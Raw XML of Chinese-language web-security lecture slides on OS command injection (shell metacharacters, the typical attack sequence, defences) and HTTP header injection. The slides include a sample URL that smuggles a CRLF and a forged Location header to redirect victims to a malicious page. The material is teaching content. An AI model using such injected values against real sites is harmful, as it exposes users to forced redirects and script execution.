          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令注入</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8" y="1457181"/>
            <a:ext cx="8069551" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="47625" y="1457181"/>
            <a:ext cx="3990975" cy="2381250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4038600" y="1457181"/>
            <a:ext cx="5105400" cy="2371725"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="748145" y="4408055"/>
            <a:ext cx="7786254" cy="1798781"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solid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8" y="1457180"/>
            <a:ext cx="8083407" cy="4943619"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>上述攻击成功的主要原因是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>支持连续执行多条命令，如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Unix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>操作系统</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>中使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>分号（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>或</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>管道（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>|</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等字符支持连续执行多条命令，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>操作系统</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>cmd.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>符号</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>来连接多条命令。这些符号一般称为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>的元字符，如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>命令参数中混入了元字符，就会使攻击者添加的操作系统命令被执行，这就是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>注入漏洞产生的原因</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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8" y="1374053"/>
            <a:ext cx="7764752" cy="4943619"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>命令注入攻击的一般流程为：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>从外部下载攻击用软件；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>对下载来的软件授予执行权限；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>从内部攻击操作系统漏洞以取得管理员权限；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>攻击者在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器上执行攻击操作，如：浏览、篡改或删除</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器内的文件，对外发送邮件，以此服务器作跳板攻击其他服务器等</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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4847" y="1374053"/>
            <a:ext cx="7986425" cy="4943619"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>命令注入攻击</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>防御策略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>选择不调用操作系统命令的实现方法，即不调用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>功能，而用其它方法实现；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>避免使用内部可能会调用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的函数；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>不将外部输入的字符串作为命令行参数；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用安全的函数对传递给操作系统的参数进行转义，消除</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>元字符带来的威胁。由于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>转义规则的复杂性以及其它一些环境相关的原因，这一方法有时很难完全凑效。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令注入防御</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478790" y="3306442"/>
            <a:ext cx="6653829" cy="586685"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>七、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>消息头注入攻击及防范</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4013" y="1290926"/>
            <a:ext cx="8305078" cy="5109874"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>指在重定向或生成</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>时，基于外部传入的参数生成</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>响应头</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>响应头信息一般以文本格式逐行定义消息头，即消息头之间互相以换行符隔开。攻击者可以利用这一特点，在指定重定向目标</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>或</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>值的参数中插入换行符且该换行符又被直接作为响应输出，从而在受害者的浏览器上任意添加响应消息头或伪造响应消息体：生成任意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>，重定向到任意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>，更改页面显示内容，执行任意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>而造成与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>同样</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>效果</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>消息头注入</a:t>
            </a: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1055" y="1290926"/>
            <a:ext cx="8146472" cy="4680383"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>看下面的例子</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>消息头注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="665018" y="1877969"/>
            <a:ext cx="7758546" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="276225" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" kern="100" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>http://example.com/web/in.cfg?url=http://example.com/%0D%0ALocation: + http://trap. com /web/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" kern="100" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>attack.php</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="100" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="463261" y="2875292"/>
            <a:ext cx="8680739" cy="3683060"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>执行之后，浏览器会跳转到恶意网站</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>trap.com/web/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>attack.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>，而不是期望的正常网站</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>http://example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>。造成这一结果的主要原因是，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CGI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>脚本里使用的查询字符串</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>中包含了换行符（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>%0D%0A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN"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。出两个消息头：</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ts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Location: http://example.com</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
